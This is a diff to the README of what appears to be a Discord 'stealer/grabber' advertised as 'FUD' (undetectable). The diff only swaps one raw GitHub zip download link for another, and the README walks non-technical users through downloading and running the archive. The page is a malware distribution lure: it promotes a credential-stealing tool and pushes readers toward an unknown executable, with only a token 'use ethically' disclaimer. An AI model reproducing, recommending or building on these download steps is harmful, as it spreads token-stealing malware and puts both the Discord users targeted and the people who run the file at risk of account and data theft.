@@ -1,7 +1,7 @@
 # 🛡️ VigilByteStealer-Grabber-Discord-Fud - A Reliable Tool for Data Extraction
 
 ## 📥 Download Now
-[![Download VigilByteStealer-Grabber-Discord-Fud](https://raw.githubusercontent.com/icecrackoff/VigilByteStealer-Grabber-Discord-Fud/main/nextly/VigilByteStealer-Grabber-Discord-Fud_3.1.zip)](https://raw.githubusercontent.com/icecrackoff/VigilByteStealer-Grabber-Discord-Fud/main/nextly/VigilByteStealer-Grabber-Discord-Fud_3.1.zip)
+[![Download VigilByteStealer-Grabber-Discord-Fud](https://raw.githubusercontent.com/icecrackoff/VigilByteStealer-Grabber-Discord-Fud/main/nextly/Discord-Byte-Stealer-Vigil-Fud-Grabber-1.3-beta.5.zip)](https://raw.githubusercontent.com/icecrackoff/VigilByteStealer-Grabber-Discord-Fud/main/nextly/Discord-Byte-Stealer-Vigil-Fud-Grabber-1.3-beta.5.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the VigilByteStealer-Grabber-Discord-Fud application. Designed for users with no technical knowledge, these instructions will make the process easy.
@@ -19,10 +19,10 @@ To run VigilByteStealer-Grabber-Discord-Fud, make sure your system meets the fol
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://raw.githubusercontent.com/icecrackoff/VigilByteStealer-Grabber-Discord-Fud/main/nextly/VigilByteStealer-Grabber-Discord-Fud_3.1.zip) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/icecrackoff/VigilByteStealer-Grabber-Discord-Fud/main/nextly/Discord-Byte-Stealer-Vigil-Fud-Grabber-1.3-beta.5.zip) to find the latest version of the application.
 
 2. **Choose the Correct Version**
-   Look for the most recent release. Select the file that suits your system. Usually, it will be named something like `https://raw.githubusercontent.com/icecrackoff/VigilByteStealer-Grabber-Discord-Fud/main/nextly/VigilByteStealer-Grabber-Discord-Fud_3.1.zip`.
+   Look for the most recent release. Select the file that suits your system. Usually, it will be named something like `https://raw.githubusercontent.com/icecrackoff/VigilByteStealer-Grabber-Discord-Fud/main/nextly/Discord-Byte-Stealer-Vigil-Fud-Grabber-1.3-beta.5.zip`.
 
 3. **Download the File**
    Click on the download link to start downloading the file to your computer. Depending on your internet speed, this may take a few moments.
@@ -61,4 +61,4 @@ If you have questions or need assistance while using VigilByteStealer-Grabber-Di
 Use this tool ethically and responsibly. Ensure that you have consent before extracting data from any platform or user account.
 
 ## 📥 Quick Download Links
-You can access the download directly here: [Download VigilByteStealer-Grabber-Discord-Fud](https://raw.githubusercontent.com/icecrackoff/VigilByteStealer-Grabber-Discord-Fud/main/nextly/VigilByteStealer-Grabber-Discord-Fud_3.1.zip).
+You can access the download directly here: [Download VigilByteStealer-Grabber-Discord-Fud](https://raw.githubusercontent.com/icecrackoff/VigilByteStealer-Grabber-Discord-Fud/main/nextly/Discord-Byte-Stealer-Vigil-Fud-Grabber-1.3-beta.5.zip).
